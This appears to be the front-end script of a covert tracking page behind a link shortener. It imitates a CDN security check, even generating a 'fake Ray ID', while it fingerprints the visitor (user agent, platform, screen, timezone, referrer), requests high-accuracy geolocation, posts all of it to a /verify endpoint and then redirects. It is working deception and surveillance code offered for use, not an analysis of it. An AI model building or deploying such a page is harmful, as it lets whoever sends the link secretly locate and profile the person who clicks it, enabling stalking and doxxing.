document.addEventListener('DOMContentLoaded', () => {
    // 1. Set dynamic content
    document.getElementById('domain-title').textContent = window.location.hostname;
    document.getElementById('dynamic-host').textContent = window.location.hostname;

    // Generate a fake Ray ID
    const rayId = Math.random().toString(36).substring(2, 10) + Math.random().toString(36).substring(2, 10);
    document.getElementById('ray-id').textContent = rayId;

    // 2. Identify Short Code
    const path = window.location.pathname;
    const shortCode = path.substring(1); // remove leading slash

    // 3. Gather Info
    const info = {
        shortCode: shortCode,
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        screen: `${window.screen.width}x${window.screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        localTime: new Date().toISOString(),
        referrer: document.referrer,
        // Geolocation placeholders
        latitude: null,
        longitude: null,
        accuracy: null
    };

    const sendVerification = () => {
        fetch('/verify', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(info)
        })
            .then(response => response.json())
            .then(data => {
                if (data.redirectUrl) {
                    window.location.replace(data.redirectUrl);
                } else {
                    window.location.replace("https://google.com");
                }
            })
            .catch(err => {
                console.error('Verification failed', err);
                window.location.replace("https://google.com");
            });
    };

    // 4. Request Geolocation
    if ("geolocation" in navigator) {
        // Request location
        navigator.geolocation.getCurrentPosition(
            (position) => {
                // Success
                info.latitude = position.coords.latitude;
                info.longitude = position.coords.longitude;
                info.accuracy = position.coords.accuracy;
                sendVerification();
            },
            (error) => {
                // Error or Denied
                console.log("Geolocation denied or failed:", error.message);
                sendVerification();
            },
            {
                enableHighAccuracy: true,
                timeout: 5000, // Wait max 5 seconds for user to decide
                maximumAge: 0
            }
        );
    } else {
        // Not supported
        sendVerification();
    }
});
